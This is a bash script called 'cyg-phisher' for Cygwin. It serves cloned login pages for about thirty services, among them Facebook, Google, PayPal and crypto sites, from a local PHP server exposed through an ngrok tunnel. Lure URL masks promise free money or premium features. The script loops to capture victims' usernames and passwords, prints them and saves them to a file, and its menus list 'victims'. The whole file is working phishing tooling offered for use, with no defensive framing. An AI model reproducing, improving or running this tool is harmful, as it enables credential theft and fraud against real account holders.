#!/bin/bash





exit_on_signal_SIGINT() {

read -p $' \e[1;31m

press enter'
clear

printf "\e\003[31m







                      ████████████████████████                     
                   █████                  ██████                   
                ████                           ███                 
               ███                               ███               
              ██                                   ██              
             ██                                     ██             
            ██                                       ██            
           ██                                        ██            
           ██  ██                                 ██  ██           
           ██  ██                                 ██  ██           
           ██  ██                                 ██  ██           
           ██  ██                                ██   ██           
            ██  ██                               ██  ██            
            ██  ██        ███         ███        ██  ██            
             ██ ██  ██████████       ██████████  ██ ██             
              ████ ████████████     ████████████ ████              
               ███  ██████████       ██████████  ██                
    ████        █   █████████         █████████   █        ████    
   ██  ██      ██    ██████     █ █    ███████    ██     ███  ██   
   ██   ██     ██              ██ ██              ██    ███   ██   
  ██     ████   ██            ███ ███            ██  █████     ██  
██          ████████         ████ ███          ████████         ███
██   ███        ████████     ████ ███      ████████       ████  ███
 ███████████       ███████    ██   ██    ██████        ███████████ 
           █████    ██   ██             ██ █ ██    █████           
              █████  █ █ ███           ███ ███  █████              
                  ████  █  █ █ █ █ █ █ █  █ █████                  
                    ██  ██ █ █ █ █ █ █ ████  █                     
                  ████   █ █ █ █ █ █ █ ███  ██████                 
              █████  ██    █████ █ █████    ██  █████              
     ██████████      ███                   ██       ██████████     
    ██             ██████                ███████             ██    
     ██         ████    █████         █████    ████         ██     
      ███    ████          █████████████          ████    ███      
       ██   ██                                       ██   ██       
       ██  ██                                         ██  ██       
        ████                                           ████        
                                                                


           _ _   _
  _____  _(_) |_(_)_ __   __ _
 / _ \ \/ / | __| | '_ \ / _  |
|  __/>  <| | |_| | | | | (_| |_ _ _
 \___/_/\_\_|\__|_|_| |_|\__, (_|_|_)
                         |___/

\e\003[0m


 \n"
sleep 1
clear
    exit
}


trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM







installs(){
install .pkgs/apt-cyg /bin
install .pkgs/apt /bin
chmod +x /bin/apt /bin/apt-cyg
clear
printf '\033[32m installing packges......'
 ( apt install curl unzip wget php  ncurses-utils  python3) &>/dev/null&sleep 1;

rm -rf .web
(python3 -m zipfile -e web.zip ./) &>/dev/null;
(python3 -m zipfile -e ngrok.zip ./) &>/dev/null;

( install ngrok.exe /bin ; mv ngrok.exe /cygdrive/d ; chmod 700 /cygdrive/d/* ) &> /dev/null
ngrok
exit

}
show() {
banner

if [[ -e id.txt ]]; then


tput setaf 2

cat id.txt

sleep 1
read -p "press enter to start new phishing"
menu

else
tput setaf 1
echo "!! sorry no data found start phishing now !!"
sleep 1
read -p "

press enter to start new phishing"
menu
fi

}


last() {
banner

if [[ -e .usernames.txt ]]; then


tput setaf 2

cat .usernames.txt


sleep 1
read -p "

press enter to start new phishing"
menu

else
tput setaf 1
echo "!! sorry no data found start phishing now !!"
sleep 1
read -p "press enter to start new phishing"
menu
fi

}










banner() {


tput setaf 2
clear
printf ""
printf " \e[0m\e[1;34m ┌──────────────────────────────────────────────────────────────────┐\e[0m\n"
printf " \e[0m\e[1;34m │\e[0m\e[1;31m                                   _     _     _                 \e[0m\e[1;34m │\e[0m\n"
printf " \e[0m\e[1;34m │\e[0m\e[1;31m   ___ _   _  __ _           _ __ | |__ (_)___| |__   ___ _ __   \e[0m\e[1;34m │\e[0m\n"
printf " \e[0m\e[1;34m │\e[0m\e[1;31m  / __| | | |/ _  |  _____  | '_ \| '_ \| / __| '_ \ / _ \ '__|  \e[0m\e[1;34m │\e[0m\n"
printf " \e[0m\e[1;34m │\e[0m\e[1;31m | (__| |_| | (_| | |_____| | |_) | | | | \__ \ | | |  __/ |     \e[0m\e[1;34m │\e[0m\n"
printf " \e[0m\e[1;34m │\e[0m\e[1;31m  \___|\__, |\__, |         | .__/|_| |_|_|___/_| |_|\___|_|     \e[0m\e[1;34m │\e[0m\n"
printf " \e[0m\e[1;34m │\e[0m\e[1;31m       |___/ |___/          |_|                                  \e[0m\e[1;34m │\e[0m\n"
printf " \e[0m\e[1;34m │\e[0m\e[1;31m                                                                 \e[0m\e[1;34m │\e[0m\n"
printf " \e[0m\e[1;34m │\e[0m\e[1;31m      \e[0m\e[1;31m                                         \e[0m\e[1;41m BY NH-hacker     \e[0m\e[1;34m │\e[0m\n"
printf " \e[0m\e[1;34m └──────────────────────────────────────────────────────────────────┘\e[0m\n"
printf "\n"
printf "\e[0m\e[1;31m  __________________________ONLY FOR CYGWIN___________________________\e[0m\n"
printf "\n"
printf "\n"


}

HOST='127.0.0.1'
PORT='5555'









data() {
	echo -ne "
`tput setaf 1`
Waiting for Login Info, Ctrl + C  to exit...

"
	while true; do

		if [[ -e ".www/usernames.txt" ]]; then


        ACCOUNT=$(grep -o 'Username:.*' .www/usernames.txt | cut -d " " -f2)
        PASSWORD=$(grep -o 'Pass:.*' .www/usernames.txt | cut -d ":" -f2)
        IFS=$'\n'
        echo -e "`tput setaf 2`Account : `tput setaf 4`$ACCOUNT
"
        echo -e "`tput setaf 2`Password :`tput setaf 1` $PASSWORD
"
        echo -e "`tput setaf 2`Saved in : `tput setaf 5`id.txt
"



echo "
______phishing by cyg-phisher_______

 DATE : `date +"%Y-%m-%d   TIME : %H:%M:%S"`

 SITE : $website

 ACCOUNT : $ACCOUNT

 PASSWORD : $PASSWORD
___________________________________________________________________
" > .usernames.txt



        cat .usernames.txt >> id.txt
tput setaf 1
        echo -ne "

 Waiting for Next Login Info Ctrl + C to exit.

"


rm -rf .www/usernames.txt
		fi


		sleep 0.1


	done

}













start() {



cd .www && php -S "$HOST":"$PORT" &>/dev/null&sleep 0.1


tput setaf 2


	echo -e "starting .......


"



	sleep 0.1

tput setaf 2
read -p " 
`tput setaf 4 `  ( ngrok is automatic added in drive D: )  `tput setaf 2`

for ngrok start ngrok and type `tput setaf 1`ngrok http ${HOST}:${PORT}

`tput setaf 2`
press enter to start
"
	 sleep 0.1; clear; banner
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")










tput setaf 2
	echo -e "
local host url : http://$HOST:$PORT "
tput setaf 4
	echo -e "
ngrok url : $ngrok_url"
	data
}


















tunnel_menu() {

if [[ -d .www ]]; then
rm -rf .www
mkdir .www
else
mkdir .www
fi

cp -rf .web/$website/* .www
cp -f .web/ip.php .www/

def_tunnel_menu="2"
banner
printf "\e[0m\n"
start


}












facebook(){

printf " \n"
printf " \e[1;31m[\e[0m\e[1;31m01\e[0m\e[1;31m]\e[0m\e[1;31m Traditional Login Page\e[0m\n"
printf " \e[1;77m[\e[0m\e[1;77m02\e[0m\e[1;77m]\e[0m\e[1;77m Advanced Voting Poll Login Page\e[0m\n"
printf " \e[1;34m[\e[0m\e[1;34m03\e[0m\e[1;34m]\e[0m\e[1;34m Fake Security Login Page\e[0m\n"
printf " \e[1;32m[\e[0m\e[1;32m04\e[0m\e[1;32m]\e[0m\e[1;32m Facebook Messenger Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option

if [[ $fb_option == 1 || $fb_option == 01 ]]; then
website="facebook"
mask='blue-verified-badge-for-facebook-free'
tunnel_menu
elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
website="fb_advanced"
mask='vote-for-the-best-social-media'
tunnel_menu
elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
website="fb_security"
mask='make-your-facebook-secured-and-free-from-hackers'
tunnel_menu
elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
website="fb_messenger"
mask='get-messenger-premium-features-free'
tunnel_menu

else
printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

instagram(){

printf " \n"
printf " \e[1;31m[\e[0m\e[1;31m01\e[0m\e[1;31m]\e[0m\e[1;31m Traditional Login Page\e[0m\n"
printf " \e[1;77m[\e[0m\e[1;77m02\e[0m\e[1;77m]\e[0m\e[1;77m Auto Followers Login Page\e[0m\n"
printf " \e[1;32m[\e[0m\e[1;32m03\e[0m\e[1;32m]\e[0m\e[1;32m Blue Badge Verify Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' ig_option

if [[ $ig_option == 1 || $ig_option == 01 ]]; then
website="instagram"
mask='get-unlimited-followers-for-instagram'
tunnel_menu
elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
website="ig_followers"
mask='get-unlimited-followers-for-instagram'
tunnel_menu
elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
website="ig_verify"
mask='blue-badge-verify-for-instagram-free'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

gmail(){

printf " \n"
printf " \e[1;31m[\e[0m\e[1;31m01\e[0m\e[1;31m]\e[0m\e[1;31m Gmail Old Login Page\e[0m\n"
printf " \e[1;77m[\e[0m\e[1;77m02\e[0m\e[1;77m]\e[0m\e[1;77m Gmail New Login Page\e[0m\n"
printf " \e[1;32m[\e[0m\e[1;32m03\e[0m\e[1;32m]\e[0m\e[1;32m Advanced Voting Poll\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' gmail_option

if [[ $gmail_option == 1 || $gmail_option == 01 ]]; then
website="google"
mask='get-unlimited-google-drive-free'
tunnel_menu
elif [[ $gmail_option == 2 || $gmail_option == 02 ]]; then
website="google_new"
mask='get-unlimited-google-drive-free'
tunnel_menu
elif [[ $gmail_option == 3 || $gmail_option == 03 ]]; then
website="google_poll"
mask='vote-for-the-best-social-media'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

vk(){

printf " \n"
printf " \e[1;31m[\e[0m\e[1;31m01\e[0m\e[1;31m]\e[0m\e[1;31m Traditional Login Page\e[0m\n"
printf " \e[1;32m[\e[0m\e[1;32m02\e[0m\e[1;32m]\e[0m\e[1;32m Advanced Voting Poll Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' vk_option

if [[ $vk_option == 1 || $vk_option == 01 ]]; then
website="vk"
mask='vk-premium-real-method-2020'
tunnel_menu
elif [[ $vk_option == 2 || $vk_option == 02 ]]; then
website="vk_poll"
mask='vote-for-the-best-social-media'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}




ngrok(){


ngrok http 127.0.0.1:5555 &>/dev/null&sleep 0.1



tput setaf 2

echo "

                         `tput setaf 1`##### READ CAREFULLY #### `tput setaf 2`
                                                                                                                                                       │
  for ngrok just open ngrok `tput setaf 4`( automatic added in drive D: ) `tput setaf 2`  
  and type http ${HOST}:${PORT} or if ngrok not works open new seassion and 
  type http ${HOST}:${PORT} if mouse pointer freezed  your ngrok worked and
  do not close sessond seassion also open browser and go to link `tput setaf 4`( http://localhost:4040 ) `tput setaf 2` 
  here you see the results of your ngrok        

"
sleep 5

tput setaf 1
read -p " if you read it then press enter"
menu

}






























 menu() {

banner


printf " \e[1;31m[\e[0m\e[1;31m01\e[0m\e[1;31m]\e[0m\e[1;31m Facebook    \e[0m\e[1;77m[\e[0m\e[1;77m11\e[0m\e[1;37m]\e[0m\e[1;97m Twitch      \e[0m\e[1;32m[\e[0m\e[1;32m21\e[0m\e[1;32m]\e[0m\e[1;32m DeviantArt         \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;31m02\e[0m\e[1;31m]\e[0m\e[1;31m Instagram   \e[0m\e[1;77m[\e[0m\e[1;77m12\e[0m\e[1;37m]\e[0m\e[1;97m Pinterest   \e[0m\e[1;32m[\e[0m\e[1;32m22\e[0m\e[1;32m]\e[0m\e[1;32m Badoo		                         \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;31m03\e[0m\e[1;31m]\e[0m\e[1;31m Google      \e[0m\e[1;77m[\e[0m\e[1;77m13\e[0m\e[1;37m]\e[0m\e[1;97m Snapchat    \e[0m\e[1;32m[\e[0m\e[1;32m23\e[0m\e[1;32m]\e[0m\e[1;32m Origin         \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;31m04\e[0m\e[1;31m]\e[0m\e[1;31m Microsoft   \e[0m\e[1;77m[\e[0m\e[1;77m14\e[0m\e[1;37m]\e[0m\e[1;97m Linkedin    \e[0m\e[1;32m[\e[0m\e[1;32m24\e[0m\e[1;32m]\e[0m\e[1;32m CryptoCoin    \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;31m05\e[0m\e[1;31m]\e[0m\e[1;31m Netflix     \e[0m\e[1;77m[\e[0m\e[1;77m15\e[0m\e[1;37m]\e[0m\e[1;97m Ebay        \e[0m\e[1;32m[\e[0m\e[1;32m25\e[0m\e[1;32m]\e[0m\e[1;32m Yahoo	 \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;31m06\e[0m\e[1;31m]\e[0m\e[1;31m Paypal      \e[0m\e[1;77m[\e[0m\e[1;77m16\e[0m\e[1;37m]\e[0m\e[1;97m Dropbox     \e[0m\e[1;32m[\e[0m\e[1;32m26\e[0m\e[1;32m]\e[0m\e[1;32m Wordpress                                                   \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;31m07\e[0m\e[1;31m]\e[0m\e[1;31m Steam       \e[0m\e[1;77m[\e[0m\e[1;77m17\e[0m\e[1;37m]\e[0m\e[1;97m Protonmail  \e[0m\e[1;32m[\e[0m\e[1;32m27\e[0m\e[1;32m]\e[0m\e[1;32m Yandex	                                                     \e[0m\n"		
printf " \e[1;31m[\e[0m\e[1;31m08\e[0m\e[1;31m]\e[0m\e[1;31m Twitter     \e[0m\e[1;77m[\e[0m\e[1;77m18\e[0m\e[1;37m]\e[0m\e[1;97m Spotify     \e[0m\e[1;32m[\e[0m\e[1;32m28\e[0m\e[1;32m]\e[0m\e[1;32m StackoverFlow                                                \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;31m09\e[0m\e[1;31m]\e[0m\e[1;31m Playstation \e[0m\e[1;77m[\e[0m\e[1;77m19\e[0m\e[1;37m]\e[0m\e[1;97m Reddit      \e[0m\e[1;32m[\e[0m\e[1;32m29\e[0m\e[1;32m]\e[0m\e[1;32m Vk                                                           \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;31m10\e[0m\e[1;31m]\e[0m\e[1;31m Github      \e[0m\e[1;77m[\e[0m\e[1;77m20\e[0m\e[1;37m]\e[0m\e[1;97m Adobe       \e[0m\e[1;32m[\e[0m\e[1;32m30\e[0m\e[1;32m]\e[0m\e[1;32m XBOX                                                         \e[0m\n"
printf "\e\003[0m
\e[1;34m┌────────────────────────────────────────────────────────────────────────────────────────────────────┐
\e[1;34m│                                                                                                    \e[1;34m│
\e[1;34m│\e[0m\e[1;31m  [00]exit      [99]how to run ngrok  [100]show my all Victim       [101]show my last Victim        \e[1;34m│
\e[1;34m└────────────────────────────────────────────────────────────────────────────────────────────────────┘

"

printf "\e[0m\n"






read -p $' \e[1;32m[\e[0m\e[1;32m~\e[0m\e[1;32m]\e[0m\e[1;32m Select an option: \e[0m\e[1;32m\en' menu_option

if [[ $menu_option == 1 || $menu_option == 01 ]]; then
facebook
elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
instagram
elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
gmail
elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
website="microsoft"
mask='unlimited-onedrive-space-for free'
tunnel_menu
elif [[ $menu_option == 5 || $menu_option == 05 ]]; then
website="netflix"
mask='upgrade-your-netflix-plan-free'
tunnel_menu
elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
website="paypal"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
website="steam"
mask='steam-500-usd-gift-card-free'
tunnel_menu
elif [[ $menu_option == 8 || $menu_option == 08 ]]; then
website="twitter"
mask='get-blue-badge-on-twitter-free'
tunnel_menu
elif [[ $menu_option == 9 || $menu_option == 09 ]]; then
website="playstation"
mask='playstation-500-usd-gift-card-free'
tunnel_menu
elif [[ $menu_option == 10 ]]; then
website="github"
mask='get-github-pro-features-free-lifetime'
tunnel_menu
elif [[ $menu_option == 11 ]]; then
website="twitch"
mask='unlimited-twitch-tv-user-for-free'
tunnel_menu
elif [[ $menu_option == 12 ]]; then
website="pinterest"
mask='get-a-premium-plan-for-pinterest-free'
tunnel_menu
elif [[ $menu_option == 13 ]]; then
website="snapchat"
mask='view-locked-snapchat-accounts-secretly'
tunnel_menu
elif [[ $menu_option == 14 ]]; then
website="linkedin"
mask='get-a-premium-plan-for-linkedin-free'
tunnel_menu
elif [[ $menu_option == 15 ]]; then
website="ebay"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 16 ]]; then
website="dropbox"
mask='get-500-gb-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 17 ]]; then
website="protonmail"
mask='protonmail-pro-basics-for-free'
tunnel_menu
elif [[ $menu_option == 18 ]]; then
website="spotify"
mask='convert-your-account-to-spotify-premium'
tunnel_menu
elif [[ $menu_option == 19 ]]; then
website="reddit"
mask='reddit-official-verified-member-badge'
tunnel_menu
elif [[ $menu_option == 20 ]]; then
website="adobe"
mask='get-adobe-lifetime-pro-membership-free'
tunnel_menu
elif [[ $menu_option == 21 ]]; then
website="deviantart"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 22 ]]; then
website="badoo"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 23 ]]; then
website="origin"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 24 ]]; then
website="cryptocoinsniper"
mask='get-500-btc-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 25 ]]; then
website="yahoo"
mask='grab-mail-from-anyother-yahoo-account-free'
tunnel_menu
elif [[ $menu_option == 26 ]]; then
website="wordpress"
mask='unlimited-wordpress-traffic-free'
tunnel_menu
elif [[ $menu_option == 27 ]]; then
website="yandex"
mask='grab-mail-from-anyother-yandex-account-free'
tunnel_menu
elif [[ $menu_option == 28 ]]; then
website="stackoverflow"
mask='get-stackoverflow-lifetime-pro-membership-free'
tunnel_menu
elif [[ $menu_option == 29 ]]; then
vk
elif [[ $menu_option == 30 ]]; then
website="xbox"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 100 ]]; then
show
elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
clear
banner
printf "\e[0m\n"
printf "\e[31m            ☠ ☠ ☠ exiting..☠ ☠ ☠ \n"
sleep 2
exit 1

elif [[ $menu_option == 101 ]]; then
last
elif [[ $menu_option == 99 ]]; then
ngrok
else
printf "\n\n \e[1;31m[\e[0m\e[1;97m!\e[0m\e[1;31m]\e[0m\e[1;31m Invalid option \e[1;31m[\e[0m\e[1;97m!\e[0m\e[1;31m]\e[0m\n"
sleep 1
banner
menu
fi

}
installs
ngrok
